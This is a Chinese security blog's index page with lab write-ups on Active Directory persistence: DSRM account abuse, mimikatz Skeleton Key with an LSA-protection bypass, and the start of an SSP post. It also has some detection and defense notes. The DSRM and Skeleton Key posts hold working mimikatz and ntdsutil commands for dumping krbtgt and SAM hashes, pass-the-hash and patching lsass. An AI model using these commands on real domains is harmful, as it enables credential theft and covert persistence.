<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 5.4.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">

<link rel="stylesheet" href="https://fonts.cat.net/css?family=Lato:300,300italic,400,400italic,700,700italic|Fira Code:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"swanq.top","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
  </script>

  <meta name="description" content="让自己去触碰安全的blue sky">
<meta property="og:type" content="website">
<meta property="og:title" content="SwanQ&#39;s Blue SKY">
<meta property="og:url" content="http://swanq.top/index.html">
<meta property="og:site_name" content="SwanQ&#39;s Blue SKY">
<meta property="og:description" content="让自己去触碰安全的blue sky">
<meta property="og:locale" content="zh_CN">
<meta property="article:author" content="swanQ">
<meta property="article:tag" content="penetration, forensics, web, cyber security">
<meta name="twitter:card" content="summary">

<link rel="canonical" href="http://swanq.top/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : true,
    isPost : false,
    lang   : 'zh-CN'
  };
</script>

  <title>SwanQ's Blue SKY</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">SwanQ's Blue SKY</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
      <p class="site-subtitle" itemprop="description">TO LIVE IS TO RISK IT ALL</p>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>

  </li>
        <li class="menu-item menu-item-tags">

    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签<span class="badge">59</span></a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类<span class="badge">9</span></a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">29</span></a>

  </li>
  </ul>
</nav>




</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content index posts-expand">
            
      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://swanq.top/2021/07/15/%E5%9F%9F%E6%B8%97%E9%80%8F%E6%8F%90%E6%9D%83%E4%B9%8BDSRM-ABUSE/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/author.jpg">
      <meta itemprop="name" content="swanQ">
      <meta itemprop="description" content="让自己去触碰安全的blue sky">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="SwanQ's Blue SKY">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/07/15/%E5%9F%9F%E6%B8%97%E9%80%8F%E6%8F%90%E6%9D%83%E4%B9%8BDSRM-ABUSE/" class="post-title-link" itemprop="url">域渗透维权之DSRM</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2021-07-15 14:26:20" itemprop="dateCreated datePublished" datetime="2021-07-15T14:26:20+08:00">2021-07-15</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2021-07-16 19:36:34" itemprop="dateModified" datetime="2021-07-16T19:36:34+08:00">2021-07-16</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%9F%9F%E6%B8%97%E9%80%8F/" itemprop="url" rel="index"><span itemprop="name">域渗透</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>1.7k</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>2 分钟</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="0x00前言"><a href="#0x00前言" class="headerlink" title="0x00前言"></a>0x00前言</h1><p>除了krbtgt账户外，DC上还有一个可以利用的账户：目录服务还原模式账户DSRM。本篇文章主要介绍攻击者在获取域管权限之后，利用DSRM来持久化权限的手法</p>
<h1 id="0x01-简介"><a href="#0x01-简介" class="headerlink" title="0x01 简介"></a>0x01 简介</h1><p>DSRM（directory service restore mode目录服务还原模式账户）,是Windows域环境中域控制器的安全模式启动选项，每个域控中都有一个本地管理账户，就是DSRM账户，DSRM的作用是允许管理员在域环境中出现故障或崩溃时还原、修复、重建活动目录数据库，使域环境的运行恢复正常。</p>
<ul>
<li>每个域控上的本地管理员账户即目录服务还原模式账户(DSRM)</li>
<li><strong>DSRM的密码在DC安装时设置，之后很少被修改，存储在SAM文件中</strong></li>
<li><strong>其他域中密码包括administrator保存在NTDS.dit中</strong>，即使被修改对于SAM存储的密码也没影响</li>
<li>修改DSRM的方法为在DC上运行ntdsutil</li>
<li>DSRM被修改，即域控的本地管理员的密码hash被修改</li>
<li>但如果修改DC的本地管理员的密码hash，SAM数据库的hash并不会被改变，只会改变ntds.dit文件中的hash</li>
</ul>
<p>​      只要攻击者改变了DSRM账户的hash，就算此时应急改变DC管理员的密码，也可以继续利用pth哈希传递攻击。此攻击需要使用DC的<strong>ntdsutil来修改DSRM账户的密码</strong>。且需要修改<strong>DSRM的登录方式</strong>。因在windows server 2000及之后对DSRM使用控制台做出了限制。</p>
<p><strong>命令集合：</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">NTDSUTIL  &#x2F;&#x2F;打开ntdsutil </span><br><span class="line">set dsrm password  &#x2F;&#x2F;设置DSRM密码 </span><br><span class="line">reset password on server null  &#x2F;&#x2F;在当前域控上恢复DSRM密码 &lt;password&gt;  &#x2F;&#x2F;修改密码，注意这里输入的是DSRM密码,而不是Administrator的密码 </span><br><span class="line">&lt;password&gt;  &#x2F;&#x2F;再次输入 </span><br><span class="line">q  &#x2F;&#x2F;退出DSRM密码设置模式 </span><br><span class="line">q  &#x2F;&#x2F;退出ntdsutil</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">mimikatz:</span><br><span class="line">&#x2F;&#x2F;获取krbtgt的账户密码</span><br><span class="line">lsadump::dcsync &#x2F;domain:wlaq.com &#x2F;user:krbtgt </span><br><span class="line">&#x2F;&#x2F;获取SAM数据库的密码</span><br><span class="line">token::elevate </span><br><span class="line">lsadump::sam</span><br></pre></td></tr></table></figure>



<h1 id="0x02-测试"><a href="#0x02-测试" class="headerlink" title="0x02 测试"></a>0x02 测试</h1><h3 id="测试环境"><a href="#测试环境" class="headerlink" title="测试环境"></a><strong>测试环境</strong></h3><table>
<thead>
<tr>
<th align="center">IP</th>
<th align="center">描述</th>
<th>系统</th>
</tr>
</thead>
<tbody><tr>
<td align="center">192.168.221.139</td>
<td align="center">DC</td>
<td>windows server 2019(x64)</td>
</tr>
<tr>
<td align="center">192.168.221.140</td>
<td align="center">域管/域成员</td>
<td>windows 10(x64)</td>
</tr>
</tbody></table>
<h3 id="攻击测试"><a href="#攻击测试" class="headerlink" title="攻击测试"></a>攻击测试</h3><p>修改DSRM密码之后，抓取的Administrator的SAM数据库中的NTLM-hash就变成了DSRM账户密码。</p>
<p>修改DSRM有两种方法</p>
<ol>
<li><p>ntdsutil通过明文密码指定</p>
<p><img src="/2021/07/15/%E5%9F%9F%E6%B8%97%E9%80%8F%E6%8F%90%E6%9D%83%E4%B9%8BDSRM-ABUSE/1.png"></p>
</li>
<li></li>
</ol>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug  sekurlsa::pth &#x2F;user:Administrator &#x2F;domain:wlaq.com &#x2F;ntlm:F21AE66FBD82F5A624658BD1CBD0250E</span><br></pre></td></tr></table></figure>









<p>在Windows server2019上注册表并未有以下项限制DSRM登录，故可更改DC上DSRM账户的明文密码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HKLM:\System\CurrentControlSet\Control\Lsa\DsrmAdminLogonBehavior</span><br></pre></td></tr></table></figure>

<p><img src="/2021/07/15/%E5%9F%9F%E6%B8%97%E9%80%8F%E6%8F%90%E6%9D%83%E4%B9%8BDSRM-ABUSE/1.png"></p>
<h1 id="0x04-检测"><a href="#0x04-检测" class="headerlink" title="0x04 检测"></a>0x04 检测</h1><ul>
<li></li>
</ul>
<h1 id="0x05-防御"><a href="#0x05-防御" class="headerlink" title="0x05 防御"></a>0x05 防御</h1><ul>
<li></li>
</ul>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><h1 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h1><ol>
<li><a target="_blank" rel="noopener" href="https://docs.microsoft.com/zh-tw/sql/analytics-platform-system/set-admin-password-for-logging-on-to-ad-nodes-in-directory-services-restore-mode?view=aps-pdw-2016-au7">https://docs.microsoft.com/zh-tw/sql/analytics-platform-system/set-admin-password-for-logging-on-to-ad-nodes-in-directory-services-restore-mode?view=aps-pdw-2016-au7</a></li>
<li><a target="_blank" rel="noopener" href="https://www.at449.com/2020/04/27/2017/">https://www.at449.com/2020/04/27/2017/</a></li>
<li>笔误稍多，如NTLM写为NTML,但思路清晰：<a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/network/278999.html">https://www.freebuf.com/articles/network/278999.html</a></li>
</ol>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://swanq.top/2021/07/14/%E5%9F%9F%E6%B8%97%E9%80%8F%E7%BB%B4%E6%9D%83%E4%B9%8BSkeleton-Key/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/author.jpg">
      <meta itemprop="name" content="swanQ">
      <meta itemprop="description" content="让自己去触碰安全的blue sky">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="SwanQ's Blue SKY">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/07/14/%E5%9F%9F%E6%B8%97%E9%80%8F%E7%BB%B4%E6%9D%83%E4%B9%8BSkeleton-Key/" class="post-title-link" itemprop="url">域渗透维权之Skeleton Key</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2021-07-14 10:19:55" itemprop="dateCreated datePublished" datetime="2021-07-14T10:19:55+08:00">2021-07-14</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2021-07-15 14:22:55" itemprop="dateModified" datetime="2021-07-15T14:22:55+08:00">2021-07-15</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%9F%9F%E6%B8%97%E9%80%8F/" itemprop="url" rel="index"><span itemprop="name">域渗透</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>1.6k</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>1 分钟</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="0x00前言"><a href="#0x00前言" class="headerlink" title="0x00前言"></a>0x00前言</h1><p>如上上篇博客所介绍两种利用SSP进行域控权限维持的方法，都需要域控重启才可生效。本篇利用skeleton key则是立即生效，skeleton key可作为金票的替代品。</p>
<h1 id="0x01-简介"><a href="#0x01-简介" class="headerlink" title="0x01 简介"></a>0x01 简介</h1><ul>
<li><strong>在64位域控服务器上使用</strong>，因为skeleton key被安装在64位DC上</li>
<li><strong>只是让所有域用户使用同一个万能密码进行登录</strong>其目前用户可以用原密码进行登录</li>
<li>但重启后失效</li>
</ul>
<h2 id="mimikatz万能密码实现原理"><a href="#mimikatz万能密码实现原理" class="headerlink" title="mimikatz万能密码实现原理"></a>mimikatz万能密码实现原理</h2><p>在DC上以域控权限运行skeleton,能够将Kerberos认证加密降到RC4_HMAC_MD5，并以内存更新的方式给lsass.exe进程patch一个主密码mimikatz。</p>
<h1 id="0x02-测试"><a href="#0x02-测试" class="headerlink" title="0x02 测试"></a>0x02 测试</h1><h3 id="测试环境"><a href="#测试环境" class="headerlink" title="测试环境"></a><strong>测试环境</strong></h3><table>
<thead>
<tr>
<th align="center">IP</th>
<th align="center">描述</th>
<th>系统</th>
</tr>
</thead>
<tbody><tr>
<td align="center">192.168.221.139</td>
<td align="center">DC</td>
<td>windows server 2019(x64)</td>
</tr>
<tr>
<td align="center">192.168.221.140</td>
<td align="center">域管/域成员</td>
<td>windows 10(x64)</td>
</tr>
</tbody></table>
<h3 id="攻击测试"><a href="#攻击测试" class="headerlink" title="攻击测试"></a>攻击测试</h3><p>1.在DC上以域控权限运行skeleton key,将Kerberos的认证加密降到RC4_HMAC_MD5，并以内存更新的方式给lsass.exe进程patch密码mimikatz。但是为什么要这么做还是得把所有攻击复现完成之后看看mimikatz的源码，这个工程量一定巨大</p>
<p><img src="/2021/07/14/%E5%9F%9F%E6%B8%97%E9%80%8F%E7%BB%B4%E6%9D%83%E4%B9%8BSkeleton-Key/0.png"></p>
<p>此处借用后续绕过PPL的图，先提到debug权限，然后patch密码</p>
<p>2.域内用户利用skeleton key登录域控</p>
<p>域控使用密码mimikatz建立IPC连接－net use</p>
<p><img src="/2021/07/14/%E5%9F%9F%E6%B8%97%E9%80%8F%E7%BB%B4%E6%9D%83%E4%B9%8BSkeleton-Key/1.png"></p>
<p>域管账户登录域控</p>
<p><img src="/2021/07/14/%E5%9F%9F%E6%B8%97%E9%80%8F%E7%BB%B4%E6%9D%83%E4%B9%8BSkeleton-Key/2.png"></p>
<p>普通账户登录域控时可以发现根本没有权限.可以证明只有patch了密码的域管账号才可以查看DC的目录。</p>
<p><img src="/2021/07/14/%E5%9F%9F%E6%B8%97%E9%80%8F%E7%BB%B4%E6%9D%83%E4%B9%8BSkeleton-Key/3.png"></p>
<h3 id="LSA保护"><a href="#LSA保护" class="headerlink" title="LSA保护"></a>LSA保护</h3><p>为了防止对lsass.exe的代码注入，微软在14年添加了<strong>LSA保护策略</strong>，便无法使用mimikatz对lsass.exe进行注入。当然需要我们配置一下注册表</p>
<p><img src="/2021/07/14/%E5%9F%9F%E6%B8%97%E9%80%8F%E7%BB%B4%E6%9D%83%E4%B9%8BSkeleton-Key/4.png"></p>
<p>重启系统</p>
<p>试试mimikatz直接patch万能密码，发现不可行<br><img src="/2021/07/14/%E5%9F%9F%E6%B8%97%E9%80%8F%E7%BB%B4%E6%9D%83%E4%B9%8BSkeleton-Key/5.png"></p>
<h3 id="绕过LSA"><a href="#绕过LSA" class="headerlink" title="绕过LSA"></a>绕过LSA</h3><p>当然对于LSA protection，mimikatz也是有办法绕过的.必须<strong>驱动文件：mimidrv.sys</strong>。导入驱动文件后，绕过LSA保护</p>
<p><img src="/2021/07/14/%E5%9F%9F%E6%B8%97%E9%80%8F%E7%BB%B4%E6%9D%83%E4%B9%8BSkeleton-Key/6.png"></p>
<p>直接用域管账号测试：</p>
<p><img src="/2021/07/14/%E5%9F%9F%E6%B8%97%E9%80%8F%E7%BB%B4%E6%9D%83%E4%B9%8BSkeleton-Key/7.png"></p>
<p>测试结束记得重启域控</p>
<h3 id="命令集合："><a href="#命令集合：" class="headerlink" title="命令集合："></a><strong>命令集合：</strong></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"># 清除net use连接</span><br><span class="line">net use * &#x2F;del &#x2F;y</span><br><span class="line"># 用户名密码建立net use共享资源连接</span><br><span class="line">net use \\域控主机全名  mimikatz &#x2F;user:用户名</span><br><span class="line"></span><br><span class="line"># mimikatz patch密码</span><br><span class="line">privilege::debug</span><br><span class="line">misc::skeleton</span><br><span class="line"># 绕过LSA protection</span><br><span class="line">privilege::debug</span><br><span class="line">!+</span><br><span class="line">!processprotect &#x2F;process:lsass.exe &#x2F;remove</span><br><span class="line">misc::skeleton</span><br></pre></td></tr></table></figure>

<h1 id="0x04-检测"><a href="#0x04-检测" class="headerlink" title="0x04 检测"></a>0x04 检测</h1><ul>
<li>日志4697：记录mimidrv.sys驱动的安装事件</li>
<li>sysmon日志13：mimidrv服务及对应的驱动程序</li>
<li>sysmon日志6：驱动被加载且未签名</li>
</ul>
<h1 id="0x05-防御"><a href="#0x05-防御" class="headerlink" title="0x05 防御"></a>0x05 防御</h1><ul>
<li>zBang扫描子项：Skeleton Key scan - 发现可能被 Skeleton Key 恶意感染的域控</li>
<li>SkeletonKeyScanner脚本扫描，主要通过文件名 Yara规则 已知恶意与非恶意文件的哈希 进程等进行检测：<a target="_blank" rel="noopener" href="https://github.com/Neo23x0/SkeletonKeyScanner">https://github.com/Neo23x0/SkeletonKeyScanner</a></li>
</ul>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>红队可以用Skeleton Key可在不需要破解任何域用户密码的情况下访问域内主机和网络资源。唯一的缺陷是当DC重启后，将不起作用。</p>
<h1 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h1><ol>
<li><a target="_blank" rel="noopener" href="https://wooyun.js.org/drops/%E5%9F%9F%E6%B8%97%E9%80%8F%E2%80%94%E2%80%94Skeleton%20Key.html">https://wooyun.js.org/drops/%E5%9F%9F%E6%B8%97%E9%80%8F%E2%80%94%E2%80%94Skeleton%20Key.html</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/SwiftOnSecurity/sysmon-config/blob/master/sysmonconfig-export.xml">https://github.com/SwiftOnSecurity/sysmon-config/blob/master/sysmonconfig-export.xml</a></li>
<li><a target="_blank" rel="noopener" href="https://pentestlab.blog/2018/04/10/skeleton-key/">https://pentestlab.blog/2018/04/10/skeleton-key/</a></li>
</ol>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://swanq.top/2021/07/13/%E7%AE%80%E5%8D%95%E6%81%B6%E6%84%8F%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E5%88%9D%E6%8E%A2/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/author.jpg">
      <meta itemprop="name" content="swanQ">
      <meta itemprop="description" content="让自己去触碰安全的blue sky">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="SwanQ's Blue SKY">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/07/13/%E7%AE%80%E5%8D%95%E6%81%B6%E6%84%8F%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E5%88%9D%E6%8E%A2/" class="post-title-link" itemprop="url">简单恶意样本分析初探</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2021-07-13 16:38:30" itemprop="dateCreated datePublished" datetime="2021-07-13T16:38:30+08:00">2021-07-13</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2021-07-14 10:08:16" itemprop="dateModified" datetime="2021-07-14T10:08:16+08:00">2021-07-14</time>
              </span>

          
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>209</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>1 分钟</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>在复现SSP攻击的时候遇到了dll文件的分析，听说web学习到后期一定是二进制，那今天就来敲敲二进制的大门吧，如果文章中有不对的地方，敬请指出</p>
<p>检验样本哈希</p>
<p>　<img src="/2021/07/13/%E7%AE%80%E5%8D%95%E6%81%B6%E6%84%8F%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E5%88%9D%E6%8E%A2/1.png"></p>
<p>查壳：文件由Visual C++所写，无壳</p>
<p>　<img src="/2021/07/13/%E7%AE%80%E5%8D%95%E6%81%B6%E6%84%8F%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E5%88%9D%E6%8E%A2/2.png"></p>
<p>参考：</p>
<ol>
<li>IDA使用：<a target="_blank" rel="noopener" href="https://z3r3f.gitee.io/2019/02/15/IDA%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7%E6%80%BB%E7%BB%93/">https://z3r3f.gitee.io/2019/02/15/IDA%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7%E6%80%BB%E7%BB%93/</a></li>
</ol>
<p>问题：</p>
<ol>
<li>导入表</li>
<li>资源表</li>
</ol>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://swanq.top/2021/07/12/%E5%9F%9F%E6%B8%97%E9%80%8F%E7%BB%B4%E6%9D%83%E4%B9%8BSSP/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/author.jpg">
      <meta itemprop="name" content="swanQ">
      <meta itemprop="description" content="让自己去触碰安全的blue sky">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="SwanQ's Blue SKY">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/07/12/%E5%9F%9F%E6%B8%97%E9%80%8F%E7%BB%B4%E6%9D%83%E4%B9%8BSSP/" class="post-title-link" itemprop="url">域渗透维权之SSP</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2021-07-12 11:10:40" itemprop="dateCreated datePublished" datetime="2021-07-12T11:10:40+08:00">2021-07-12</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2021-07-14 11:32:37" itemprop="dateModified" datetime="2021-07-14T11:32:37+08:00">2021-07-14</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%9F%9F%E6%B8%97%E9%80%8F/" itemprop="url" rel="index"><span itemprop="name">域渗透</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>2.4k</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>2 分钟</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="0x00前言"><a href="#0x00前言" class="headerlink" title="0x00前言"></a>0x00前言</h1><p>咱今儿来看看单纯的维权，如果拿到了目标机器的system权限，可以利用SSP进行维权。其基础环境如下：</p>
<table>
<thead>
<tr>
<th align="center">IP</th>
<th align="center">描述</th>
<th align="center">系统</th>
</tr>
</thead>
<tbody><tr>
<td align="center">192.168.221.139</td>
<td align="center">DC</td>
<td align="center">windows server 2019(x64)</td>
</tr>
<tr>
<td align="center">192.168.221.140</td>
<td align="center">域管/域成员</td>
<td align="center">windows 10(x64)</td>
</tr>
</tbody></table>
<h1 id="0x01-简介"><a href="#0x01-简介" class="headerlink" title="0x01 简介"></a>0x01 简介</h1><h2 id="概念："><a href="#概念：" class="headerlink" title="概念："></a>概念：</h2><p><strong>SSP</strong>：Security Support Provider，直译为安全支持提供者，<strong>注册表中为Security Package</strong>.SSP就是一个用来实现身份认证的DLL</p>
<p><strong>SSPI</strong>：Security Support Provider Interface，直译为安全支持提供程序接口，是<strong>Windows系统在执行认证操作所使用的API</strong>。SSPI是SSP的API接口</p>
<p><img src="/2021/07/12/%E5%9F%9F%E6%B8%97%E9%80%8F%E7%BB%B4%E6%9D%83%E4%B9%8BSSP/1.png"></p>
<p><strong>lsass.exe</strong> ：作为Windows的系统进程，用于本地安全和登录策略;<strong>系统启动时，SSP 将被加载到lsass.exe进程中</strong>。</p>
<p><strong>LSA</strong> ：Local Security Authority，用于身份验证; 且可进行扩展。</p>
<h2 id="原理："><a href="#原理：" class="headerlink" title="原理："></a>原理：</h2><p>因为LSA是可扩展的，所以可以自定义恶意dll,在系统启动时加载到lsass.exe进程中，就可获取lsass.exe中的明文密码。即使用户更改密码并重新登录，攻击者依然可以获取其新密码。</p>
<p>主要有两种攻击方式，体现于0x02和0x03</p>
<h1 id="0x02-memssp加载到内存："><a href="#0x02-memssp加载到内存：" class="headerlink" title="0x02 memssp加载到内存："></a>0x02 memssp加载到内存：</h1><p><strong>原理：</strong>主要通过往lsass进程注入代码来patch其加载的msv1_0.dll中的<strong>SpAcceptCredentials</strong>函数来恢复凭据信息。</p>
